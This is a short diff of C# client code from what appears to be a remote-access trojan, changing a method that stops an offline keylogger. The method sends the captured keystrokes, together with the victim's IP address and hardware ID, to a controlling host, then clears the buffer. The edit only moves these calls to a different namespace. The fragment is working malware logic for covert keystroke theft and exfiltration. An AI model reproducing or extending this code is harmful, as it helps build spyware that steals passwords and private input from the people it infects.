@@ -75,9 +75,9 @@ namespace Client
 
         private void StopOfflineKeyLogger()
         {
-            Plugin.Launch.StopHook();
-            Plugin.Launch.ClientSender(EntryClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), EntryClass.clientHandler.baseIp, EntryClass.clientHandler.HWID));
-            Plugin.Launch.ClearKeyStroke();
+            Offline.Keyloggers.Launch.StopHook();
+            Offline.Keyloggers.Launch.ClientSender(EntryClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), EntryClass.clientHandler.baseIp, EntryClass.clientHandler.HWID));
+            Offline.Keyloggers.Launch.ClearKeyStroke();
             EntryClass.KeylogOn = false; 
         }
 
